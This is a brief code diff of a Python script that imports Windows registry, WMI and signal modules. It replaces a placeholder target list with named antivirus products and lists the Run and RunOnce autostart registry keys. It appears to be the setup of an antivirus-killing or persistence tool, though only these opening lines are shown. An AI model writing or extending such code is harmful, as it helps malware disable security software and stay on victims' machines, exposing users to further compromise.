@@ -1,6 +1,6 @@
 import winreg, wmi, os, signal
 
-targets = ["Antivirus_list"]
+targets = ["Windows Defender", "Avast", "McAfee", "Norton", "Kaspersky"]
 
 hives = [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER] 
 paths = ["SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"]
